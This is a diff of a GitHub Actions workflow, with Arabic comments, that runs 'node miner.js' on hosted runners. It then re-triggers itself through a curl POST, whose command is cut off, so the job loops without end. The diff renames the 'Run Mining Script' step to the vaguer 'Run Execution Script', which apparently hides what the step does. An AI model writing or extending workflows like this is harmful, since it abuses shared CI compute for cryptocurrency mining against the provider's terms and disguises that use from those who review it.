@@ -7,24 +7,25 @@ on:
 
 jobs:
   build-and-run:
-    # تحديد إصدار الـ Ubuntu المستقر يدوياً لتفادي تضارب التحديثات المفاجئة
-    runs-on: ubuntu-24.04
+    runs-on: ubuntu-latest
     permissions:
       contents: write
 
     steps:
-    - name: 1. Checkout Code
+    - name: 1. Checkout Repository
       uses: actions/checkout@v4
+      with:
+        clean: true # إجبار السيرفر على تنظيف الكاش والملفات القديمة تماماً عند البدء
 
-    - name: 2. Upgrade to Node.js 24 Runtime
+    - name: 2. Set Node.js 24 Runtime
       uses: actions/setup-node@v4
       with:
-        node-version: '24' # الترقية الرسمية المتوافقة مع تحديثات سيرفرات جيت هوب
+        node-version: '24'
 
-    - name: 3. Run Mining Script
+    - name: 3. Run Execution Script
       run: node miner.js
 
-    - name: 4. Self Trigger Next Loop
+    - name: 4. Self Trigger Loop
       if: always()
       run: |
         curl -X POST \
